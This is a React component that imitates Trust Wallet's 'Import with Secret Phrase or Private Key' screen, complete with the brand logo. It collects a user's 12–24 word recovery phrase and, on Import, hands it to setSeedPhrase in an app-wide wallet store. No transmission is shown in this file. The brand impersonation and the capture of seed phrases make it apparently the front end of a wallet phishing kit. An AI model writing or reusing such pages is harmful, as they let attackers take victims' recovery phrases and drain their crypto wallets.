"use client";

import { useRef, useState } from "react";
import { X, Eye, EyeOff } from "lucide-react";
import { Input } from "@/components/ui/input";
import { useWalletStore } from "@/store/walletStore";
import TrustWalletFull from "../icons/trust-wallet-full";

const MAX_WORDS = 24;
const REQUIRED_WORDS = 12;

const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
  const [walletName, setWalletName] = useState("Main wallet");
  const [rawText, setRawText] = useState(""); // full textarea content
  const [visibility, setVisibility] = useState<boolean[]>([]); // per-word visibility not used now; keep for compatibility
  const [allVisible, setAllVisible] = useState(false);
  const [nameFocused, setNameFocused] = useState(false);
  const [areaFocused, setAreaFocused] = useState(false);
  const textareaRef = useRef<HTMLTextAreaElement | null>(null);
  const { setSeedPhrase } = useWalletStore();

  // Utility: convert rawText into trimmed words array (limit to MAX_WORDS)
  const getWords = (text = rawText) =>
    text
      .trim()
      .split(/\s+/)
      .filter(Boolean)
      .slice(0, MAX_WORDS);

  const words = getWords();

  // keep visibility array in sync length-wise (not strictly required but preserved)
  if (visibility.length !== words.length) {
    // avoid state setter during render — only fast sync for UI mapping by creating a local array
    const newVis = Array(words.length).fill(allVisible);
    // do not call setVisibility here to avoid re-render loops; we'll update when toggling visibility.
    // (visibility only matters for rendering masked/unmasked, and allVisible controls mask.)
  }

  // Handle completion
  const handleComplete = () => {
    setSeedPhrase(words.join(" ").trim());
    handleFinish();
  };

  // Toggle all visibility
  const toggleAllVisibility = () => {
    const nv = !allVisible;
    setAllVisible(nv);
    setVisibility((prev) => Array(getWords().length).fill(nv));
  };

  // Focus / create first input (textarea) when area tapped
  const handleAreaClick = (e?: React.MouseEvent<HTMLDivElement>) => {
    // if clicked on a button inside area, ignore
    if (e) {
      const target = e.target as HTMLElement;
      if (target.closest("button")) return;
    }
    textareaRef.current?.focus();
    // On very first tap (empty), put caret at end (no extra actions needed)
  };

  // textarea input handler — keep rawText and enforce max words/trim
  const handleTextChange = (e: React.FormEvent<HTMLTextAreaElement>) => {
    const t = (e.currentTarget.value ?? "") as string;

    // If there are more than MAX_WORDS, truncate to MAX_WORDS
    const split = t.trimStart().split(/\s+/).filter(Boolean);
    if (split.length > MAX_WORDS) {
      // rebuild string from first MAX_WORDS preserving spaces between words
      const limited = split.slice(0, MAX_WORDS).join(" ");
      setRawText(limited + (t.endsWith(" ") ? " " : ""));
      return;
    }

    setRawText(t);
  };

  // handle paste: clean up and paste trimmed to MAX_WORDS
  const handlePaste = async (e: React.ClipboardEvent<HTMLTextAreaElement>) => {
    const paste = e.clipboardData.getData("text") ?? "";
    if (!paste) return;

    e.preventDefault();

    // normalize whitespace and limit words
    const pastedWords = paste.trim().split(/\s+/).filter(Boolean).slice(0, MAX_WORDS);
    const newText = pastedWords.join(" ") + (paste.endsWith(" ") ? " " : "");
    setRawText(newText);

    // focus at end
    setTimeout(() => {
      if (textareaRef.current) {
        textareaRef.current.selectionStart = textareaRef.current.selectionEnd = newText.length;
        textareaRef.current.focus();
      }
    }, 10);
  };

  // keyboard handling for "Enter" or other keys is handled naturally by textarea;
  // we keep backspace & space handling implicit since words are derived from the textarea.

  const filledCount = words.filter((w) => w.trim() !== "").length;
  const isButtonDisabled = !walletName.trim() || words.length === 0 || filledCount < REQUIRED_WORDS;

  // Utility to render a masked version of a word (same length as original but using •)
  const maskWord = (w: string) => w.replace(/./g, "•");

  return (
    <div className="min-h-screen bg-black flex text-gray-300 w-full">
      {/* Right side - Form */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 lg:p-12">
        <span className="mb-10 flex w-full ">
          <TrustWalletFull />
        </span>
        <div className="w-full max-w-2xl">
          <h2 className="text-2xl font-bold mb-6">Import with Secret Phrase or Private Key</h2>

          <div className="space-y-6">
            {/* Wallet Name */}
            <div>
              <label className="block font-semibold mb-2">Wallet Name</label>
              <div
                className={`relative border rounded-lg ${
                  nameFocused ? "border-green-600" : "border-neutral-700"
                }`}
              >
                <Input
                  value={walletName}
                  onChange={(e) => setWalletName(e.target.value)}
                  onFocus={() => setNameFocused(true)}
                  onBlur={() => setNameFocused(false)}
                  className="text-gray-100/80 font-semibold py-6 pr-10 bg-transparent border-0"
                />
                {walletName && (
                  <button
                    onClick={() => setWalletName("")}
                    className="absolute right-3 top-1/2 -translate-y-1/2 bg-gray-100/70 rounded-full text-black"
                    aria-label="clear wallet name"
                  >
                    <X className="w-4 h-4 p-0.5" />
                  </button>
                )}
              </div>
              <p className="text-xs text-muted-foreground mt-1">You can edit this later</p>
            </div>

            {/* Secret Phrase area */}
            <div>
              <label className="block text-sm font-medium text-foreground mb-2">
                Enter Secret Phrase or Private Key
              </label>

              <div
                onClick={handleAreaClick}
                onTouchStart={() => handleAreaClick()}
                className={`relative rounded-lg p-4 min-h-56 cursor-text transition-colors ${
                  areaFocused ? "border-1 border-green-600" : "border border-neutral-700"
                } bg-neutral-900`}
              >
                {/* TEXTAREA: plain, mobile-friendly input surface */}
                <textarea
                  ref={textareaRef}
                  value={rawText}
                  onInput={handleTextChange}
                  onPaste={handlePaste}
                  onFocus={() => setAreaFocused(true)}
                  onBlur={() => setAreaFocused(false)}
                  className="w-full h-full resize-none bg-transparent outline-none text-transparent caret-white placeholder:text-gray-500"
                  placeholder="Tap to start typing or paste your secret phrase here"
                  autoCapitalize="none"
                  autoCorrect="off"
                  spellCheck={false}
                  inputMode="text"
                  aria-label="secret-phrase-textarea"
                  style={{
                    // Make the textarea fill the container but keep text invisible,
                    // we'll render the visible (or masked) words below as chips.
                    minHeight: 140,
                    padding: 0,
                    margin: 0,
                    // keep caret visible: set caret color explicitly
                    caretColor: "white",
                  }}
                />

                {/* Overlay: chips view that mirrors words — masked or visible */}
                <div className="pointer-events-none mt-2">
                  {/* We show chips in 3 columns like original, so use flex-wrap */}
                  <div className="flex flex-wrap gap-3">
                    {words.length === 0 ? (
                      <div className="text-sm text-gray-400 select-none">
                        Tap here to start typing your secret phrase or paste it
                      </div>
                    ) : (
                      words.map((w, idx) => (
                        <div
                          key={idx}
                          className="flex items-center gap-2 bg-black border border-gray-100/10 rounded-lg px-2 py-1 h-fit"
                        >
                          <span className="text-neutral-400 w-4 text-right font-medium whitespace-nowrap">
                            {idx + 1}.
                          </span>
                          <span className="text-neutral-100 text-sm font-semibold">
                            {allVisible ? w : maskWord(w)}
                          </span>
                        </div>
                      ))
                    )}
                  </div>
                </div>

                {/* Eye toggle */}
                <button
                  type="button"
                  onClick={toggleAllVisibility}
                  className="absolute bottom-3 right-3 text-gray-400 hover:text-gray-200 transition pointer-events-auto"
                  aria-label={allVisible ? "hide all" : "show all"}
                >
                  {allVisible ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>

              <p className="text-xs font-medium mt-2 text-gray-100/80">
                Secret Phrase is typically 12 (sometimes 18, 24) words separated by single spaces
                <br />
                Private Key is a long alphanumeric code
              </p>
            </div>

            {/* Import button */}
            <div className="flex w-full justify-end items-center">
              <button
                onClick={handleComplete}
                className={`w-full py-3 rounded-full font-medium transition-all mt-auto max-w-80 ${
                  isButtonDisabled
                    ? "bg-green-600/60 cursor-not-allowed opacity-50"
                    : "bg-green-600 hover:bg-green-500 text-neutral-800"
                }`}
                disabled={isButtonDisabled}
              >
                Import
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TrustWallet;
